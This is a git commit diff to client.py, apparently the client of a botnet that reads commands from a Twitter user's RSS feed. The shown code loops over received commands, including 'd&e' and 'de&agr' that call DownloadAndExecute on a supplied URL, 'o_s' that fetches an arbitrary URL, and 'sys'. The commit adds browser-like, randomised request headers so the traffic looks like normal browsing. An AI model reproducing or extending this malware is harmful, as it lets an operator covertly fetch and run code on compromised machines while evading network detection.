554014b320d86ba80b901a87a80f1917f22620a9
Vlad <35502476+TheDevFromKer@users.noreply.github.com>
2018-06-27 18:52:31 +0200

    Add files via upload

--- client.py
+++ client.py
@@ -10,11 +10,20 @@ twitter_user = ""
 prev_command = ""
 ua_strings = ['Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.2; he-il; SAMSUNG SM-G900X Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.6 Chrome/28.0.1500.94 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2483.0 Safari/537.36']
 
+def retHeaders():
+    header = {
+        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+        'accept-encoding': 'gzip, deflate, br',
+        'dnt': "1",
+        'User-Agent': ua_strings[randint(1, len(ua_strings))],  
+        }
+    
+    return header
+
 def getTask():
     global prev_command
 
-    header = {'User-Agent': ua_strings[randint(1, len(ua_strings))]}
-    r = requests.get("https://twitrss.me/twitter_user_to_rss/?user="+twitter_user, headers=header)
+    r = requests.get("https://twitrss.me/twitter_user_to_rss/?user="+twitter_user, headers=retHeaders())
 
     tmp = r.text.split("\n")
     tmp = tmp[len(tmp)-12]
@@ -43,8 +52,7 @@ while True:
     if tmp[0] == "d&e":
         DownloadAndExecute(tmp[1], "")
     elif tmp[0] == "o_s":
-        header = {'User-Agent': ua_strings[randint(1, len(ua_strings))]}
-        requests.get(tmp[1], headers=header, allow_redirects=True)
+        requests.get(tmp[1], headers=retHeaders(), allow_redirects=True)
     elif tmp[0] == "de&agr":
         DownloadAndExecute(tmp[1],tmp[2])
     elif tmp[0] == "sys":
